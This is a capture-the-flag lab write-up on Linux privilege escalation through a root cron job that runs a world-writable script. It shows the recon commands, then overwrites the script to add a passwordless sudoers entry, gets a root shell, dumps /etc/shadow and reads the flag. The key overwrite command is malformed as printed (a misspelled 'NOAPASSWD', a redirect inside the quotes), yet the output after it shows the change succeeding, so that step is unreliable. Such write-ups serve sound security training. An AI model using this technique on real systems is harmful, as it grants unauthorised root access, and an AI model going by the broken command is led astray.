- Linux implements task scheduling through a utility called Cron
- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specific schedule
- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.
- The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.
- Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the `root` user.
- This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with the root access.
- In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.

---

Cron is a life save for admins when it comes to doing periodic maintainence tasks on the system. They can even be used in cases where tasks are performed within individual user directories. However, such automations need to be used with caution or can lead to easy privilege escalation attacks.

**Your mission is to get a root shell on the box**andÂ retrieve the flag!

Checking the privileges and the users on system 

```
student@attackdefense:~$ groups
student
student@attackdefense:~$ whoami
student
student@attackdefense:~$ uname -a
Linux attackdefense.com 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
student@attackdefense:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
student:x:999:999:student:/home/app:/bin/sh
```

Checking for Cron tab

```
student@attackdefense:~$ crontab -l
no crontab for student
student@attackdefense:~$ ls -la
total 12
drwxr-xr-x 1 student student 4096 Sep 23  2018 .
drwxr-xr-x 1 root    root    4096 Sep 23  2018 ..
-rw------- 1 root    root      26 Sep 23  2018 message
student@attackdefense:~$ cat message
cat: message: Permission denied
```

As we are unable to check the content of the message let us try to find if there are any mentions of the same file in the system or any code etc using grep

```
student@attackdefense:~$ pwd
/home/student
student@attackdefense:~$ cd /
student@attackdefense:/$ grep -rnw /usr -e "/home/student/message"
/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
```

Now we got the output that the same message can be viewed from the `/tmp/message` file hope we have permission to view file from the tmp directory.

```
student@attackdefense:/$ cd /tmp/
student@attackdefense:/tmp$ ls
message
student@attackdefense:/tmp$ cat message
Hey!! you are not root :(
```

Okay we got the message now let us go ahead and see the actual bash script to see what it was tasked to do.

```
student@attackdefense:/tmp$ ls -la /usr/local/share/copy.sh
-rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
student@attackdefense:/tmp$ cat /usr/local/share/copy.sh
#! /bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
```

As we see that the only thing that the script is doing it copying the file from the home directory to tmp directory and removing the permissions on it. Let us go ahead and change the script completely and write a one line command it to get us the root privileges.

```
printf '#!/bin/bash\necho "student ALL=NOAPASSWD:ALL" >> /etc/sudoers > /usr/local/share/copy.sh'
```

Once the script is executed our account will be added to the sudoers list and we will be able to execute all the commands without password.

```
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /etc/init.d/cron
    (root) NOPASSWD: ALL
student@attackdefense:/tmp$ cd /
student@attackdefense:/$ sudo su
root@attackdefense:/# cat /etc/shadow
root:*:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17797::::::
```

```
root@attackdefense:/# whoami
root
root@attackdefense:/# cd /root
root@attackdefense:~# ls
flag
root@attackdefense:~# cat flag
697914df7a07bb9b718c8ed258150164
root@attackdefense:~# crontab -l
*/01 * * * * sh /usr/local/share/copy.sh *
```

